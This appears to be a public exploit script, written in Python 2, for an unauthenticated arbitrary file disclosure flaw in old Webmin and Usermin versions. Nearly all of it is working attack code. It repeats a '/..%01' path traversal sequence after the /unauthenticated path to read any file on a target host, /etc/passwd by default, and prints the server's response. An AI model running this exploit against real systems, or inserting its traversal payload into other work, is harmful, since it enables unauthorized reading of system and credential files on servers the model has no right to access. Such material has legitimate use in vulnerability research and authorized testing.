#!/usr/bin/python
# Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Python)
# flaw in /unauthenticated cause LFI
# Auther Vishal Biswas (https://twitter.com/CyberKnight00)
 
import optparse
import requests

parser = optparse.OptionParser()

parser.add_option('-r', '--http', action="store", dest="http", help="http or https")
parser.add_option('-t', '--hostss', action="store", dest="host", help="Host name to send payload")
parser.add_option('-p', '--port', action="store", dest="port", help="port in which webmin service is running")
parser.add_option('-f', '--file', action="store", dest="file", help="File name to read or include")

options, args = parser.parse_args()

if not options.host:
    print "[+] Specify a host name"
    print "[+] Example usage webmin.py -r http --host 192.168.56.1 -p 10000 -f /etc/passwd"
    exit()

host = options.host
port = options.port
http = options.http
file = options.file

if not options.http :
	http = 'http'

if not options.port :
	port = 10000

if not options.file :
	file = '/etc/passwd'



ck = "/..%01"

for i in range (60):
	ck += "/..%01"

target = str(http) + "://" + str(host) + ":" + str(port) + "/unauthenticated" + str(ck) + "/" + str(file) + ""

print target

url = target

print "\n"

r = requests.get(url)

print r.status_code
print r.text

print r
